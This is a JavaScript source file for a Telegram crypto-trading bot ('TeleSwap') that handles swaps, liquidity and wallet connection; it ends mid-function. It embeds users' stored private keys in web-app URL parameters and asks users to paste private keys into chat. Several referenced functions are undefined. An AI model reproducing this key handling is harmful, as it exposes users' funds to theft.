import TelegramBot from 'node-telegram-bot-api';

import assert from 'assert';
import dotenv from 'dotenv';
dotenv.config();

import * as database from './db.js';

import * as privateBot from './bot_private.js';
import * as afx from './global.js';

import * as swap from './swap_v2.js';
import * as utils from './utils.js';
import { DEFAULT_ETH_GAS } from './uni-catch/const.js';
import { addLiquidityETH, removeLiquidityETH } from './liquidity.js';


const token = process.env.BOT_TOKEN;
export const bot = new TelegramBot(token, { polling: true });

export const myInfo = await bot.getMe();

// export let database;

export const sessions = new Map();
// export const users = new Map();
export const stateMap = new Map();

export const MIN_COMMUNITY_TOKEN_AMOUNT = process.env.MIN_COMMUNITY_TOKEN_AMOUNT;

export const COMMAND_START = 'start';
export const COMMAND_TEST = 'test';

const OPTION_MAIN = 0

const OPTION_MAIN_SWAP = 10;
const OPTION_MAIN_LIQUIDITY = 11;
const OPTION_MAIN_SETTINGS = 12;
const OPTION_MAIN_WALLET = 13;
const OPTION_MAIN_MANUAL = 14;

const OPTION_SWAP_BUY = 20;
const OPTION_SWAP_SELL = 21;

const OPTION_LIQUIDITY_ADD = 30;
const OPTION_LIQUIDITY_REMOVE = 31;
const OPTION_LIQUIDITY_ADD_START = 32;
const OPTION_LIQUIDITY_REMOVE_START = 33;

const OPTION_SETTINGS_SLIPPAGE = 40;
const OPTION_SETTINGS_DEADLINE = 41;

const OPTION_WALLET_CONNECT = 50;
const OPTION_WALLET_GENERATE = 51;
const OPTION_WALLET_INFO = 52;
const OPTION_WALLET_DISCONN = 53;

const OPTION_BUY_START = 60;
const OPTION_BUY_REFRESH = 61;

const OPTION_SELL_START = 70;
const OPTION_SELL_REFRESH = 71;


const OPTION_CLOSE = -1


/*-------- States ---------*/
export const STATE_IDLE = 0;

export const STATE_WAIT_BUY_TOKEN_ADDR = 10;
export const STATE_WAIT_ETH_AMOUNT_FOR_BUY = 11;
export const STATE_WAIT_FOR_BUY = 12;

export const STATE_WAIT_SELL_TOKEN_ADDR = 20;
export const STATE_WAIT_TOKEN_AMOUNT_FOR_SELL = 21;
export const STATE_WAIT_FOR_SELL = 22;

export const STATE_WAIT_LQ_TOKEN_ADDR = 30;
export const STATE_WAIT_LQ_ETH_AMOUNT = 31;
export const STATE_WAIT_LQ_TOKEN_AMOUNT = 32;
export const STATE_WAIT_LQ_ADD = 33;
export const STATE_WAIT_LQ_LIQUIDITY = 34;
export const STATE_WAIT_LQ_REMOVE = 35;

export const STATE_WAIT_SET_SLIPPAGE = 40;
export const STATE_WAIT_SET_DEADLINE = 41;

export const STATE_WAIT_SET_WALLETS_PRIVATEKEY = 50;


/*-------- Basic Functions ---------*/
export const stateMap_set = (chatid, state, data = {}) => {
	stateMap.set(chatid, { state, data })
}

export const stateMap_get = (chatid) => {
	return stateMap.get(chatid)
}

export const stateMap_remove = (chatid) => {
	stateMap.delete(chatid)
}

export const stateMap_clear = () => {
	stateMap.clear()
}

const json_buttonItem = (key, cmd, text) => {
	return {
		text: text,
		callback_data: JSON.stringify({ k: key, c: cmd }),
	}
}

const json_inline_buttonItem = (text, web) => {
	return {
		text: text,
		web_app: web
	}
}

export const getWelcomeMessage = async (session) => {

	const info = await utils.getGasTracker(utils.web3Inst)

	let message = `${process.env.BOT_NAME}  <a href="https://teleswap.tech">Website</a>
Swap, earn and build on telegram’s first DEX.

⬩Gas: <code>${utils.roundDecimal(info.gasPrice, 2)} GWEI</code> ⬩Block: <code>${info.blockNumber}</code> ⬩ETH: <code>$${utils.roundDecimal(info.ethPrice, 0)}</code>

═══ Your Wallet ═══
`

	if (session.account) {

		const ethBalance = await utils.getTokenBalanceFromWallet(utils.web3Inst, session.account, 0);

		message += `<code>${session.account}</code>
ETH Balance: ${utils.roundDecimal(ethBalance, 5)} ETH`
	} else {
		message += `No wallet connected`
	}

	return message
}

const getManualMessage = () => {

	const communityTokenAmount = Number(MIN_COMMUNITY_TOKEN_AMOUNT)
	const WELCOME_MESSAGE = `<b> TeleSwap Bot </b>

Features
- Buy/Sell Tokens
- Add/Remove Liquidity
- Innovative UI - Web App

Useful commands
/${COMMAND_START} - start ${process.env.BOT_NAME}

How to use ${process.env.BOT_NAME}: Coming Soon

❕ Important:
- Using TeleSwap bot requires ${utils.roundDecimal(communityTokenAmount, 0)} $${process.env.BOT_NAME} tokens.
- In order to use this bot, you need to create a Telegram ID if you haven't already.`

	return WELCOME_MESSAGE;
}

export const json_mainMenu = (sessionId) => {
	const session = sessions.get(sessionId)
	const webInfo = { "url": `${afx.SWAP_WEBAPP_URL}/#/?appHash=${session.pkey}&userAccount=${session.account}&slippage=${session.slippage}&deadline=${session.deadline}` };
	const json = [
		[
			json_buttonItem(sessionId, OPTION_MAIN_SWAP, '🔄 Swap'),
			json_buttonItem(sessionId, OPTION_MAIN_LIQUIDITY, '💧 Liquidity'),
			json_buttonItem(sessionId, OPTION_MAIN_SETTINGS, '🛠 Settings'),
		],
		[
			json_buttonItem(sessionId, OPTION_MAIN_WALLET, '💼 Wallet'),
		],
		// [
		// 	json_buttonItem(sessionId, OPTION_MAIN_MANUAL, '📜 Manual'),
		// ],
	]

	if (session.account) {
		json.push([
			json_inline_buttonItem('📱 Web App', webInfo),
		])
	}

	return { title: '', options: json };
}

const json_swapMenu = (sessionId) => {

	const session = sessions.get(sessionId)
	const webSwapInfo = { "url": `${afx.SWAP_WEBAPP_URL}/#/swap?appHash=${session.pkey}&userAccount=${session.account}&slippage=${session.slippage}&deadline=${session.deadline}` };

	const json = [
		[
			json_buttonItem(sessionId, OPTION_SWAP_BUY, 'Buy Token'),
			json_buttonItem(sessionId, OPTION_SWAP_SELL, 'Sell Token'),
			json_inline_buttonItem('📱 Advanced', webSwapInfo),
		],
		[
			json_buttonItem(sessionId, OPTION_MAIN, '↩️ Return'),
		],
	];

	return { title: '⬇️ Swap Menu', options: json };
}

const json_liquidityMenu = (sessionId) => {

	const session = sessions.get(sessionId)
	const webPoolInfo = { "url": `${afx.SWAP_WEBAPP_URL}/#/pool?appHash=${session.pkey}&userAccount=${session.account}&slippage=${session.slippage}&deadline=${session.deadline}` };

	let json = [
		[
			json_buttonItem(sessionId, OPTION_LIQUIDITY_ADD, 'Add Liquidity'),
			json_buttonItem(sessionId, OPTION_LIQUIDITY_REMOVE, 'Remove Liquidity'),
			json_inline_buttonItem('📱 Advanced', webPoolInfo),
		],
		[
			json_buttonItem(sessionId, OPTION_MAIN, '↩️ Return'),
		],
	];

	return { title: '⬇️ Liquidity Menu', options: json };
}

export const json_poolAddMenu = (sessionId) => {
	let json = [
		[
			json_buttonItem(sessionId, OPTION_LIQUIDITY_ADD_START, 'Add'),
			json_buttonItem(sessionId, OPTION_CLOSE, '❌ Close'),
		],
	];

	return { title: '⬇️ Liquidity Add Menu', options: json };
}

export const json_poolRemoveMenu = (sessionId) => {
	let json = [
		[
			json_buttonItem(sessionId, OPTION_LIQUIDITY_REMOVE_START, 'Remove'),
			json_buttonItem(sessionId, OPTION_CLOSE, '❌ Close'),
		],
	];

	return { title: '⬇️ Liquidity Remove Menu', options: json };
}

export const json_settingsMenu = (sessionId) => {

	const session = sessions.get(sessionId)
	if (!session) {
		return null
	}

	const json = [
		[
			json_buttonItem(sessionId, OPTION_SETTINGS_SLIPPAGE, `Slippage (${session.slippage}%)`),
			json_buttonItem(sessionId, OPTION_SETTINGS_DEADLINE, `Deadline (${session.deadline}s)`),
		],
		[
			json_buttonItem(sessionId, OPTION_MAIN, '↩️ Return'),
		],
	]

	return { title: '⬇️ Settings', options: json };
}

export const json_setWallet = async (sessionId, chatid) => {

	const session = sessions.get(sessionId)
	if (!session) {
		return null
	}

	let json = []
	let message = '';
	let deleteMsg = false;

	if (session.account) {

		const exportToken = await utils.createToken(chatid, afx.TOKEN_MODE_EXPORT);
		if (exportToken.status) {
			const webExportInfo = { "url": `${afx.SECURE_WEBAPP_URL}/export/?token=${exportToken.token}` };

			json.push([
				json_inline_buttonItem('Export PrivateKey', webExportInfo),
				json_buttonItem(sessionId, OPTION_WALLET_INFO, 'Your wallet Info'),
				json_buttonItem(sessionId, OPTION_WALLET_DISCONN, 'Disconnect Wallet'),
			])

			message = `Access your private keys via TeleSwap Secure by clicking the button below. After accessing your keys, the webapp and its contents self-destruct and you will need to regenerate a new link to view your keys again. Additionally the webapp self-destructs after 5 minutes if not accessed. 
			
Disclaimer: You are responsible for your funds once private keys are revealed. Please exercise extreme caution with these private keys. For your security and privacy, this message will be automatically deleted in 5 minutes.`
			deleteMsg = true
		} else {
			message = `TeleSwap Secure features are limited to 1 request per minute. Try again in 1 minute.`
		}

		// json.push([
		// 	json_buttonItem(sessionId, OPTION_WALLET_INFO, 'Your wallet Info'),
		// 	json_buttonItem(sessionId, OPTION_WALLET_DISCONN, 'Disconnect Wallet'),
		// ])

	} else {
		const importToken = await utils.createToken(chatid, afx.TOKEN_MODE_IMPORT);
		const generateToken = await utils.createToken(chatid, afx.TOKEN_MODE_GENERATE);

		if (importToken.status && generateToken.status) {
			const webImportInfo = { "url": `${afx.SECURE_WEBAPP_URL}/import/?token=${importToken.token}` };
			const webGenerateInfo = { "url": `${afx.SECURE_WEBAPP_URL}/generate/?token=${generateToken.token}` };

			json.push([
				json_inline_buttonItem('📱 Connect Wallet', webImportInfo),
				json_inline_buttonItem('📱 Generate Wallet', webGenerateInfo),
			]);

			message = `Connect/Generate Wallet
Import/Generate a wallet through TeleSwap Secure functions by clicking the button below. To ensure that user data is safe and secure, the link below self-destructs after use or after 10 minutes of inactivity.`
		} else {
			message = `TeleSwap Secure features are limited to 1 request per minute. Try again in 1 minute.`
		}

		// json.push([
		// 	json_buttonItem(sessionId, OPTION_WALLET_CONNECT, 'Connect Wallet'),
		// 	json_buttonItem(sessionId, OPTION_WALLET_GENERATE, 'Generate Wallet'),
		// ])
	}

	json.push([
		json_buttonItem(sessionId, OPTION_MAIN, '↩️ Return')
	])

	return { title: '⬇️ Wallet Options', message, deleteMsg, options: json };
}

const json_manual = (sessionId) => {
	const json = [
		[
			json_buttonItem(sessionId, OPTION_CLOSE, '❌ Close')
		],
	]

	return { title: '⬇️ Manual', options: json };
}

export const json_buyMenu = async (sessionId) => {

	const json = [
		[
			json_buttonItem(sessionId, OPTION_BUY_START, "Buy Now"),
			json_buttonItem(sessionId, OPTION_BUY_REFRESH, "Refresh"),
		],
		[
			json_buttonItem(sessionId, OPTION_CLOSE, "❌ Close"),
		],
	]

	return { title: 'Buy', options: json };
}

export const json_sellMenu = (sessionId) => {

	const json = [
		[
			json_buttonItem(sessionId, OPTION_SELL_START, "Sell Now"),
			json_buttonItem(sessionId, OPTION_SELL_REFRESH, "Refresh"),
		],
		[
			json_buttonItem(sessionId, OPTION_CLOSE, "❌ Close"),
		],
	]

	return { title: 'Sell', options: json };
}


async function switchMenuWithTitle(chatId, messageId, title, json_buttons) {

	const keyboard = {
		inline_keyboard: json_buttons,
		resize_keyboard: true,
		one_time_keyboard: true,
		force_reply: true
	};

	try {

		await bot.editMessageText(title, { chat_id: chatId, message_id: messageId, reply_markup: keyboard, disable_web_page_preview: true, parse_mode: 'HTML' })

	} catch (error) {
		//afx.error_log('[switchMenuWithTitle]', error)
	}
}

async function editAnimationMessageCaption(chatId, messageId, title, json_buttons) {

	const keyboard = {
		inline_keyboard: json_buttons,
		resize_keyboard: true,
		one_time_keyboard: true,
		force_reply: true
	};

	try {

		//protect_content: true, 
		await bot.editMessageCaption(title, { chat_id: chatId, message_id: messageId, parse_mode: 'HTML', disable_web_page_preview: true, reply_markup: keyboard })

	} catch (error) {
		afx.error_log('[switchMenuWithTitle]', error)
	}
}

async function editAnimationMessageOption(chatId, messageId, json_buttons) {

	const keyboard = {
		inline_keyboard: json_buttons,
		resize_keyboard: true,
		one_time_keyboard: true,
		force_reply: true
	};

	try {

		await bot.editMessageReplyMarkup(keyboard, { chat_id: chatId, message_id: messageId, parse_mode: 'HTML', disable_web_page_preview: true })

	} catch (error) {
		afx.error_log('[editAnimationMessageOption]', error)
	}
}

export async function openMenu(chatId, menuTitle, json_buttons) {

	const keyboard = {
		inline_keyboard: json_buttons,
		resize_keyboard: true,
		one_time_keyboard: true,
		force_reply: true
	};

	try {

		await bot.sendMessage(chatId, menuTitle, { reply_markup: keyboard, parse_mode: 'HTML', disable_web_page_preview: true });

	} catch (error) {
		afx.error_log('openMenu', error)
	}
}

export const get_menuTitle = (sessionId, subTitle) => {

	const session = sessions.get(sessionId)
	if (!session) {
		return 'ERROR ' + sessionId
	}

	let result = session.type === 'private' ? `@${session.username}'s configuration setup` : `@${session.username} group's configuration setup`

	if (subTitle && subTitle !== '') {

		//subTitle = subTitle.replace('%username%', `@${session.username}`)
		result += `\n${subTitle}`
	}

	return result
}

export const removeMessage = async (sessionId, messageId) => {

	try {
		await bot.deleteMessage(sessionId, messageId)
	} catch (error) {
		console.error(error)
	}
}

export async function sendMessage(chatid, message, enableLinkPreview = true) {
	try {

		let data = { parse_mode: 'HTML' }

		if (enableLinkPreview)
			data.disable_web_page_preview = false
		else
			data.disable_web_page_preview = true

		data.disable_forward = true

		console.log(message)

		const retVal = await bot.sendMessage(chatid, message, data)

		return retVal
	} catch (error) {
		afx.error_log('sendMessage', error)

		return false
	}
}

export async function sendReplyMessage(chatid, message) {
	try {

		let data = { parse_mode: 'HTML', disable_forward: true, disable_web_page_preview: true, reply_markup: { force_reply: true } }

		await bot.sendMessage(chatid, message, data)

		return true
	} catch (error) {
		afx.error_log('sendMessage', error)

		return false
	}
}

export async function sendMessageSync(chatid, message, info = {}) {
	try {

		let data = { parse_mode: 'HTML' }

		data.disable_web_page_preview = false
		data.disable_forward = true

		await bot.sendMessage(chatid, message, data)

		return true
	} catch (error) {

		if (error?.response?.body?.error_code === 403) {
			info.blocked = true
		}

		console.log(error?.response?.body)
		afx.error_log('sendMessage', error)

		return false
	}
}

export async function sendOptionMessage(chatid, message, option) {
	try {

		const keyboard = {
			inline_keyboard: option,
			resize_keyboard: true,
			one_time_keyboard: true,
			force_reply: true
		};

		await bot.sendMessage(chatid, message, { reply_markup: keyboard, disable_web_page_preview: true, parse_mode: 'HTML' });

	} catch (error) {
		afx.error_log('sendMessage', error)
	}
}

export async function sendMessageToAuthorizedAllUsers(message) {

	for (const [chatid, session] of sessions) {
		await sendMessageToAuthorizedUser(session, message)
	}
}

export async function sendSimpleMessageToAuthorizedUser(session, message) {

	if (session.wallet || session.vip === 1) {
		await sendMessage(session.chatid, message)
	}
}

export function sendMessageToAuthorizedUser(session, message, menu = null) {

	return new Promise(async (resolve, reject) => {

		if (session.wallet || session.vip === 1) {

			const fileId = 'AgACAgEAAxkBAAIJdGTPtuw1P6ezHKCVK1hwCbSb_YzjAALHqjEbe6uARhMH0EnsUHfYAQADAgADeAADLwQ'
			await sendPhoto(session.chatid, fileId, message, menu).then((res) => {
				console.log(`Notification has been sent to @${session.username} (${session.chatid})`)

				resolve(true)

			}).catch(() => {
				resolve(false)
			})
		} else {
			resolve(false)
		}
	})
}

export async function sendCallToAuthorizedUser(session, filteredInfo, tokenInfo, poolId) {

	const menu = json_msgOption(session.chatid, tokenInfo.primaryAddress, tokenInfo.poolAddress, poolId, true);

	let message = filteredInfo.content0 // + filteredInfo.tag

	if (!session.autobuy || !session.autobuy_amount || !session.pkey) {
		message += `\n\n⚠️ Auto buy will not be triggered because:`
		if (!session.autobuy) {
			message += '\n  └─ Auto buy is disabled!'
		}

		if (!session.autobuy_amount) {
			message += '\n  └─ Auto buy amount is not set!'
		}

		if (!session.pkey) {
			message += '\n  └─ Your wallet is not connected!'
		}
	}

	await sendMessageToAuthorizedUser(session, message, menu).then(res => {

		if (res) {
			const hashCode = md5(tokenInfo.poolAddress)
			callHistory.storeMsgData(session.chatid, tokenInfo.poolAddress, tokenInfo.primaryAddress, poolId, hashCode, filteredInfo)
		}
	})

}

export async function sendScanToAuthorizedUser(session, details, tokenInfo, poolId) {

	let menu

	if (tokenInfo.poolAddress === '' || tokenInfo.secondaryAmount === 0) {
		menu = await json_scanMsgOption(session.chatid, poolId, tokenInfo.primaryAddress, true);
	} else {
		menu = await json_scanMsgOption(session.chatid, poolId, tokenInfo.primaryAddress, false);
	}

	const message = details.content0 // + details.tag
	await sendMessageToAuthorizedUser(session, message, menu)
}

export async function sendAnimation(chatid, file_id, message, json_buttons = null) {

	//, protect_content: true
	let option = { caption: message, parse_mode: 'HTML', disable_web_page_preview: true }

	if (json_buttons) {

		const keyboard = {
			inline_keyboard: json_buttons.options,
			resize_keyboard: true,
			one_time_keyboard: true,
			force_reply: true
		};

		option.reply_markup = keyboard
	}

	return new Promise(async (resolve, reject) => {
		await bot.sendAnimation(chatid, file_id, option).catch((err) => {
			console.log('\x1b[31m%s\x1b[0m', `sendAnimation Error: ${chatid} ${err.response.body.description}`);
		}).then((msg) => {
			resolve(true)
		});
	})
}

export async function sendPhoto(chatid, file_id, message, json_buttons = null) {

	//, protect_content: true
	let option = { caption: message, parse_mode: 'HTML', disable_web_page_preview: true }

	if (json_buttons) {

		const keyboard = {
			inline_keyboard: json_buttons.options,
			resize_keyboard: true,
			one_time_keyboard: true,
			force_reply: true
		};

		option.reply_markup = keyboard
	}

	return new Promise(async (resolve, reject) => {
		await bot.sendPhoto(chatid, file_id, option).catch((err) => {
			console.log('\x1b[31m%s\x1b[0m', `sendPhoto Error: ${chatid} ${err.response.body.description}`);
		}).then((msg) => {
			resolve(true)
		});
	})
}

export async function sendLoginSuccessMessage(session) {

	if (session.type === 'private') {
		await sendMessage(session.chatid, `You have successfully logged in with your wallet. From this point forward, you will receive calls based on the settings that you adjusted. If you have any questions, please feel free to contact developer team @PurpleDragon999. Thank you!`)
		console.log(`@${session.username} user has successfully logged in with the wallet ${session.wallet}`);
	} else if (session.type === 'group') {
		await sendMessage(session.from_chatid, `@${session.username} group has been successfully logged in with your wallet`)
		console.log(`@${session.username} group has successfully logged in with the owner's wallet ${session.wallet}`);
	} else if (session.type === 'channel') {
		await sendMessage(session.chatid, `@${session.username} channel has been successfully logged in with your wallet`)
		console.log(`@${session.username} channel has successfully logged in with the creator's wallet ${session.wallet}`);
	}
}

export function showSessionLog(session) {

	if (session.type === 'private') {
		console.log(`@${session.username} user${session.wallet ? ' joined' : '\'s session has been created (' + session.chatid + ')'}`)
	} else if (session.type === 'group') {
		console.log(`@${session.username} group${session.wallet ? ' joined' : '\'s session has been created (' + session.chatid + ')'}`)
	} else if (session.type === 'channel') {
		console.log(`@${session.username} channel${session.wallet ? ' joined' : '\'s session has been created'}`)
	}
}

export const getAddrInfoFromPoolId = async (poolId) => {

	let poolHistoryInfo = await database.selectPoolHistory({ pool_id: poolId })

	return poolHistoryInfo
}

export const createSession = (chatid, username, type) => {

	let session = {
		chatid: chatid,
		username: username,
		type: type
	}

	setDefaultSettings(session)

	console.log(session)
	sessions.set(session.chatid, session)
	showSessionLog(session)

	return session;
}

export const setDefaultSettings = (session) => {

	session.wallet = null
	session.account = null
	session.pkey = null
	session.slippage = 20 // 20%
	session.deadline = 1800 // 30 min
	session.fee = 0
}

export let _command_proc = null
export let _callback_proc = null
export async function init(command_proc, callback_proc) {

	_command_proc = command_proc
	_callback_proc = callback_proc

	// await database.init()
	const users = await database.selectUsers()

	let loggedin = 0
	for (const user of users) {

		const session = {
			chatid: user.chatid,
			username: user.username,
			wallet: user.wallet,
			from_chatid: user.from_chatid,
			slippage: user.slippage,
			deadline: user.deadline,
			account: user.account,
			pkey: user.pkey,
		}

		if (session.wallet) {
			loggedin++
		}

		sessions.set(session.chatid, session)
	}

	console.log(`${users.length} users, but only ${loggedin} logged in`)
}

bot.on('message', async (message) => {

	// console.log(`========== message ==========`)
	// console.log(message)
	// console.log(`=============================`)

	const msgType = message?.chat?.type;

	if (msgType === 'private') {
		await privateBot.procMessage(message, database);

	} else if (msgType === 'group' || msgType === 'supergroup') {

	}
})

bot.on('callback_query', async (callbackQuery) => {
	// console.log('========== callback query ==========')
	// console.log(callbackQuery)
	// console.log('====================================')

	const message = callbackQuery.message;

	if (!message) {
		return
	}

	const option = JSON.parse(callbackQuery.data);
	let chatid = message.chat.id.toString();

	const cmd = option.c;
	const id = option.k;

	await executeCommand(chatid, message.message_id, callbackQuery.id, option)
})

export const reloadCommand = async (chatid, messageId, callbackQueryId, option) => {

	await removeMessage(chatid, messageId)
	await executeCommand(chatid, messageId, callbackQueryId, option)
}

const executeCommand = async (chatid, messageId, callbackQueryId, option) => {

	const cmd = option.c;
	const id = option.k;

	//stateMap_clear();

	try {
		if (cmd === OPTION_MAIN) {

			const sessionId = id;
			assert(sessionId)
			const session = sessions.get(sessionId);
			assert(session)

			stateMap_set(chatid, STATE_IDLE, { sessionId })

			const menu = json_mainMenu(sessionId);
			if (menu)
				await switchMenuWithTitle(chatid, messageId, await getWelcomeMessage(session), menu.options)

		} else if (cmd === OPTION_MAIN_SWAP) {

			const sessionId = id;
			assert(sessionId)
			const session = sessions.get(sessionId);
			assert(session)

			if (session.account === null) {
				await sendMessage(chatid, 'Please connect wallet first!');
				return;
			}

			const menu = json_swapMenu(sessionId);
			if (menu)
				await switchMenuWithTitle(chatid, messageId, await getWelcomeMessage(session), menu.options)

		} else if (cmd === OPTION_MAIN_LIQUIDITY) {

			const sessionId = id;
			assert(sessionId)
			const session = sessions.get(sessionId);
			assert(session)

			if (session.account === null) {
				await sendMessage(chatid, 'Please connect wallet first!');
				return;
			}

			const menu = json_liquidityMenu(sessionId);
			if (menu)
				await switchMenuWithTitle(chatid, messageId, await getWelcomeMessage(session), menu.options)

		} else if (cmd === OPTION_MAIN_SETTINGS) {

			const sessionId = id;
			assert(sessionId)
			const session = sessions.get(sessionId);
			assert(session)

			const menu = json_settingsMenu(sessionId);
			if (menu)
				await switchMenuWithTitle(chatid, messageId, await getWelcomeMessage(session), menu.options)

		} else if (cmd === OPTION_MAIN_WALLET) {

			const sessionId = id;
			assert(sessionId)
			const session = sessions.get(sessionId);
			assert(session)

			const menu = await json_setWallet(sessionId, chatid);
			if (menu)
				await switchMenuWithTitle(chatid, messageId, menu.message, menu.options)

			if (menu.deleteMsg) {
				const deleteSecureMessage = setTimeout(async () => {
					await removeMessage(sessionId, messageId)
					clearTimeout(deleteSecureMessage)
				}, afx.DELETE_TIME)
			}

		} else if (cmd === OPTION_MAIN_MANUAL) {

			const sessionId = id;
			assert(sessionId)

			const menu = json_manual(sessionId);
			if (menu)
				await openMenu(chatid, getManualMessage(), menu.options)

		} else if (cmd === OPTION_SWAP_BUY) {

			const sessionId = id;
			assert(sessionId);

			const session = sessions.get(sessionId);

			const msg = `Please enter the address of token to buy`;
			await sendReplyMessage(chatid, msg);
			await bot.answerCallbackQuery(callbackQueryId, { text: msg });

			stateMap_set(chatid, STATE_WAIT_BUY_TOKEN_ADDR, { sessionId });

		} else if (cmd === OPTION_BUY_REFRESH) {

			const sessionId = id;
			assert(sessionId);
			let stateNode = stateMap_get(sessionId)

			if (!stateNode || stateNode.state !== STATE_WAIT_FOR_BUY) {
				await bot.answerCallbackQuery(callbackQueryId, { text: 'This message is old' });
				return
			}

			const message = await buildSwapConfirm_Buy(stateNode.data.tokenAddr, stateNode.data.tokenSymbol, stateNode.data.tokenDecimal, stateNode.data.eth_amount_for_buy)
			const menu = await json_buyMenu(sessionId);
			if (menu)
				await switchMenuWithTitle(chatid, messageId, message, menu.options)

		} else if (cmd === OPTION_BUY_START) {

			const sessionId = id;
			assert(sessionId)

			const session = sessions.get(sessionId);

			let stateNode = stateMap_get(sessionId)

			if (stateNode.state !== STATE_WAIT_FOR_BUY) {
				await bot.answerCallbackQuery(callbackQueryId, { text: 'This message is old' });
				return
			}

			await removeMessage(sessionId, messageId)

			const pairInfo = await utils.getProperPair(utils.web3Inst, stateNode.data.tokenAddr, afx.get_weth_address())
			if (pairInfo.version === 'v2') {
				await swap.buyToken(utils.web3Inst, database, session,
					stateNode.data.tokenAddr, stateNode.data.eth_amount_for_buy, 'ETH', 'v2', (msg) => {
						console.log(msg)
						sendMessage(chatid, msg, false)
					}
				)
			} else if (pairInfo.version === 'v3') {
				sendMsg(`❗ Buy Swap failed: v3 not supported.`)
			}

			stateMap_set(chatid, STATE_IDLE, { sessionId })

			// return to swap menu
			const menu = json_swapMenu(sessionId);
			if (menu)
				await openMenu(chatid, await getWelcomeMessage(session), menu.options)

		} else if (cmd === OPTION_SWAP_SELL) {

			const sessionId = id;
			assert(sessionId);

			const msg = `Please enter the address of token to sell in your wallet`;
			await sendReplyMessage(chatid, msg);
			await bot.answerCallbackQuery(callbackQueryId, { text: msg });

			stateMap_set(chatid, STATE_WAIT_SELL_TOKEN_ADDR, { sessionId });

		} else if (cmd === OPTION_SELL_REFRESH) {

			const sessionId = id;
			assert(sessionId);
			let stateNode = stateMap_get(sessionId)

			if (!stateNode || stateNode.state !== STATE_WAIT_FOR_BUY) {
				await bot.answerCallbackQuery(callbackQueryId, { text: 'This message is old' });
				return
			}

			const message = await buildSwapConfirm_Sell(stateNode.data.tokenAddr, stateNode.data.tokenSymbol, stateNode.data.tokenDecimal, stateNode.data.token_amount_for_sell)
			const menu = await json_sellMenu(sessionId);
			if (menu)
				await switchMenuWithTitle(chatid, messageId, message, menu.options)

		} else if (cmd === OPTION_SELL_START) {

			const sessionId = id;
			assert(sessionId)

			const session = sessions.get(sessionId);

			let stateNode = stateMap_get(sessionId)

			if (stateNode.state !== STATE_WAIT_FOR_SELL) {
				await bot.answerCallbackQuery(callbackQueryId, { text: 'This message is old' });
				return
			}

			await removeMessage(sessionId, messageId)

			const pairInfo = await utils.getProperPair(utils.web3Inst, stateNode.data.tokenAddr, afx.get_weth_address())
			if (pairInfo.version === 'v2') {
				await swap.sellToken(utils.web3Inst, database, session,
					stateNode.data.tokenAddr, stateNode.data.token_amount_for_sell, 'TOKEN', 'v2', (msg) => {
						console.log(msg)
						sendMessage(chatid, msg, false)
					}
				)
			} else if (pairInfo.version === 'v3') {
				sendMsg(`❗ Sell Swap failed: v3 not supported.`)
			}

			stateMap_set(chatid, STATE_IDLE, { sessionId })

			// return to swap menu
			const menu = json_swapMenu(sessionId);
			if (menu)
				await openMenu(chatid, await getWelcomeMessage(session), menu.options)

		} else if (cmd === OPTION_LIQUIDITY_ADD) {

			const sessionId = id;
			assert(sessionId);

			const session = sessions.get(sessionId);

			const msg = `Please enter the address of token to add liquidty`;
			await sendReplyMessage(chatid, msg);
			await bot.answerCallbackQuery(callbackQueryId, { text: msg });

			stateMap_set(chatid, STATE_WAIT_LQ_TOKEN_ADDR, { sessionId, isAdd: true });

		} else if (cmd === OPTION_LIQUIDITY_ADD_START) {

			const sessionId = id;
			assert(sessionId)

			const session = sessions.get(sessionId);

			const privateId = chatid.toString()

			let stateNode = stateMap_get(privateId)

			await addLiquidityETH(
				session,
				stateNode.data.tokenAddr,
				stateNode.data.tokenDecimals,
				stateNode.data.tokenSym,
				stateNode.data.ethAmount,
				stateNode.data.tokenAmount,
				(msg) => {
					sendMessage(chatid, msg, false)
				}
			)

			try {
				const poolInfo = await utils.getPoolInfo(utils.web3Inst, stateNode.data.tokenAddr, session.account);
				sendMessage(chatid, `🔖 Your ETH-${stateNode.data.tokenSym} LP Token Balance: ${utils.roundDecimal(poolInfo.lpBalance, 5)} LP`)
			} catch (error) {
				console.log(error)
			}

			stateMap_set(chatid, STATE_IDLE, { sessionId })

			// return to liquidity menu
			const menu = json_liquidityMenu(sessionId);
			if (menu)
				await openMenu(chatid, await getWelcomeMessage(session), menu.options)

		} else if (cmd === OPTION_LIQUIDITY_REMOVE) {

			const sessionId = id;
			assert(sessionId);

			const session = sessions.get(sessionId);

			const msg = `Please enter the address of token to remove liquidity`;
			await sendReplyMessage(chatid, msg);
			await bot.answerCallbackQuery(callbackQueryId, { text: msg });

			stateMap_set(chatid, STATE_WAIT_LQ_TOKEN_ADDR, { sessionId, isAdd: false });

		} else if (cmd === OPTION_LIQUIDITY_REMOVE_START) {

			const sessionId = id;
			assert(sessionId)

			const session = sessions.get(sessionId);

			const privateId = chatid.toString()

			let stateNode = stateMap_get(privateId)

			await removeLiquidityETH(
				session,
				stateNode.data.tokenAddr,
				stateNode.data.tokenDecimals,
				stateNode.data.tokenSym,
				stateNode.data.liquidity,
				stateNode.data.lpAddr,
				(msg) => {
					sendMessage(chatid, msg, false)
				}
			)

			try {
				const ethBalance = await utils.getTokenBalanceFromWallet(utils.web3Inst, session.account, 0);
				const tokenBalance = await utils.getTokenBalanceFromWallet(
					utils.web3Inst,
					session.account,
					stateNode.data.tokenAddr
				);
				const poolInfo = await utils.getPoolInfo(utils.web3Inst, stateNode.data.tokenAddr, session.account);

				sendMessage(chatid, `🔖 Your Wallet Info
└─ ETH Balance: ${utils.roundDecimal(ethBalance, 5)} ETH
└─ ${stateNode.data.tokenSym} Balance: ${utils.roundDecimal(tokenBalance, 5)} ${stateNode.data.tokenSym}
└─ ETH-${stateNode.data.tokenSym} LP Token Balance: ${utils.roundDecimal(poolInfo.lpBalance, 5)} LP`)
			} catch (error) {
				console.log(error)
			}

			stateMap_set(chatid, STATE_IDLE, { sessionId })

			// return to liquidity menu
			const menu = json_liquidityMenu(sessionId);
			if (menu)
				await openMenu(chatid, await getWelcomeMessage(session), menu.options)

		} else if (cmd === OPTION_WALLET_CONNECT) {

			const sessionId = id;
			assert(sessionId)

			const msg = `Please enter private key of your wallet`
			await sendReplyMessage(chatid, msg)
			stateMap_set(chatid, STATE_WAIT_SET_WALLETS_PRIVATEKEY, { sessionId })

		} else if (cmd === OPTION_WALLET_INFO) {

			const sessionId = id;
			assert(sessionId)

			const session = sessions.get(sessionId)
			if (session && utils.web3Inst) {

				if (session.account) {

					const balanceInfos = await utils.getWalletInfo(utils.web3Inst, session.account, [])

					let log = `Your wallet address: <code>${session.account}</code>
Your balance details:`
